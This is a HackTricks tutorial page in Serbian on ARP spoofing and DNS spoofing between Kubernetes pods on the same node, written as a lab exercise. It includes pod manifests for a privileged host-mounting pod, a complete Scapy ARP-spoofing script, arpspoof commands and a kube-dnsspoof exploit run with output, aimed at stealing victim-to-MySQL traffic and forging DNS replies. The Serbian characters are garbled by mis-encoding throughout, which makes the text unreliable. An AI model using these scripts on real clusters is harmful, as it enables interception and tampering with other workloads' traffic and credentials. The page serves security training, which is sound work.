# Napadi na Kubernetes mre쬿

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Uvod

U Kubernetesu je prime캖eno da podrazumevano pona코anje dozvoljava uspostavljanje veza izme캠u **svih kontejnera koji se nalaze na istom 캜voru**. Ovo va쬴 bez obzira na razlike u imenima prostora. Takva povezanost se prote쬰 do **Sloja 2** (Ethernet). Kao rezultat, ova konfiguracija potencijalno izla쬰 sistem ranjivostima. Konkretno, otvara mogu캖nost za **zlonamerni kontejner** da izvr코i **ARP spoofing napad** protiv drugih kontejnera sme코tenih na istom 캜voru. Tokom takvog napada, zlonamerni kontejner mo쬰 obmanjuju캖e presresti ili modifikovati mre쬹i saobra캖aj namenjen drugim kontejnerima.

Napadi ARP spoofinga uklju캜uju **napada캜a koji 코alje falsifikovane ARP** (Address Resolution Protocol) poruke preko lokalne mre쬰. Ovo rezultira povezivanjem **MAC adrese napada캜a sa IP adresom legitimnog ra캜unara ili servera na mre쬴**. Nakon uspe코ne izvr코enosti takvog napada, napada캜 mo쬰 presresti, modifikovati ili 캜ak zaustaviti podatke u tranzitu. Napad se izvr코ava na Sloju 2 OSI modela, zbog 캜ega podrazumevana povezanost u Kubernetesu na ovom sloju izaziva sigurnosne zabrinutosti.

U scenariju 캖e biti kreirane 4 ma코ine:

* ubuntu-pe: Privilegovana ma코ina za bekstvo na 캜vor i proveru metrika (nije potrebna za napad)
* **ubuntu-attack**: **Zlonamerni** kontejner u podrazumevanom prostoru imena
* **ubuntu-victim**: Ma코ina **rtva** u kube-system prostoru imena
* **mysql**: Ma코ina **rtva** u podrazumevanom prostoru imena
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Osnovno Kubernetes mre쬹o povezivanje

Ako 쬰lite vi코e detalja o mre쬹im temama predstavljenim ovde, idite na reference.

### ARP

Op캖enito govore캖i, **povezivanje od 캜aure do 캜aure unutar 캜vora** dostupno je putem **mosta** koji povezuje sve 캜aure. Taj most se naziva "**cbr0**". (Neki mre쬹i dodaci 캖e instalirati svoj sopstveni most.) **cbr0 tako캠e mo쬰 rukovati ARP** (Address Resolution Protocol) razre코enjem. Kada dolazni paket stigne na cbr0, mo쬰 razre코iti odredi코nu MAC adresu kori코캖enjem ARP.

Ova 캜injenica implicira da, prema podrazumevanim postavkama, **svaka 캜aura koja se izvr코ava na istom 캜voru** 캖e mo캖i da **komunicira** sa bilo kojom drugom 캜aurom na istom 캜voru (neovisno o namespace-u) na eternetskom nivou (sloj 2).

{% hint style="warning" %}
Stoga je mogu캖e izvr코iti napade **ARP Spoofinga izme캠u 캜aura na istom 캜voru.**
{% endhint %}

### DNS

U Kubernetes okru쬰njima obi캜no 캖ete prona캖i 1 (ili vi코e) **DNS servisa koji se izvr코avaju** obi캜no u kube-system namespace-u:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
U prethodnim informacijama mo쬰te primetiti ne코to interesantno, **IP adresa servisa** je **10.96.0.10** ali je **IP adresa poda** na kojem se servis izvr코ava **172.17.0.2.**

Ako proverite DNS adresu unutar bilo kog poda, prona캖i 캖ete ne코to sli캜no ovome:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Me캠utim, **캜aura ne zna** kako da do캠e do te **adrese** jer je **opseg 캜aure** u ovom slu캜aju 172.17.0.10/26.

Stoga 캖e 캜aura poslati **DNS zahtev na adresu 10.96.0.10** koji 캖e biti **preveden** od strane cbr0 **u** **172.17.0.2**.

{% hint style="warning" %}
To zna캜i da 캖e **DNS zahtev** 캜aure **uvek** i캖i preko **mosta** da **prevede** **IP servisa u IP endpointa**, 캜ak i ako je DNS server u istoj podsobi kao 캜aura.

Znaju캖i ovo, i znaju캖i da su **ARP napadi mogu캖i**, 캜aura na 캜voru 캖e mo캖i da **presretne saobra캖aj** izme캠u **svake 캜aure** u **podsobi** i **mosta** i **modifikuje** **DNS odgovore** od DNS servera (**DNS prevara**).

맚avi코e, ako je **DNS server** na **istom 캜voru kao napada캜**, napada캜 mo쬰 **presresti sve DNS zahteve** bilo koje 캜aure u klasteru (izme캠u DNS servera i mosta) i modifikovati odgovore.
{% endhint %}

## ARP Prevara u 캜aurama na istom 캜voru

Na코 cilj je **ukrasti bar komunikaciju od ubuntu-victim do mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Preno코enje

Kao 코to je ve캖 pomenuto, ako **kompromitujete pod na istom 캜voru DNS servera poda**, mo쬰te **MitM** sa **ARPSpoofing**-om **mosta i DNS** poda i **modifikovati sve DNS odgovore**.

Imate zaista koristan **alat** i **tutorial** za testiranje ovoga na [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

U na코em scenariju, **preuzmite** **alat** u napada캜kom podu i kreirajte \*\*fajl nazvan `hosts` \*\* sa **domenima** koje 쬰lite **preno코enje** kao:
```
cat hosts
google.com. 1.1.1.1
```
Izvr코ite napad na ma코inu ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Ako poku코ate da napravite svoj DNS spoofing skript, ako **samo izmenite DNS odgovor** to **ne캖e raditi**, jer 캖e **odgovor** imati **src IP** adresu zlonamernog **poda** i **ne캖e** biti **prihva캖en**.\
Potrebno je generisati **novi DNS paket** sa **src IP** adresom **DNS-a** gde rtva 코alje DNS zahtev (코to je ne코to poput 172.16.0.2, a ne 10.96.0.10, to je IP adresa K8s DNS servisa, a ne DNS servera, vi코e o tome u uvodu).
{% endhint %}

## Snimanje saobra캖aja

Alat [**Mizu**](https://github.com/up9inc/mizu) je jednostavan, ali mo캖an API **pregleda캜 saobra캖aja za Kubernetes** koji vam omogu캖ava da **vidite svu API komunikaciju** izme캠u mikroservisa kako biste pomogli u otklanjanju gre코aka i re코avanju problema.\
Instalira캖e agente u odabranim podovima, prikupiti informacije o njihovom saobra캖aju i prikazati ih na web serveru. Me캠utim, za ovo 캖e vam biti potrebne visoke K8s dozvole (i nije ba코 neprimetno).

## Reference

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Red Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Red Tim Ekspert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
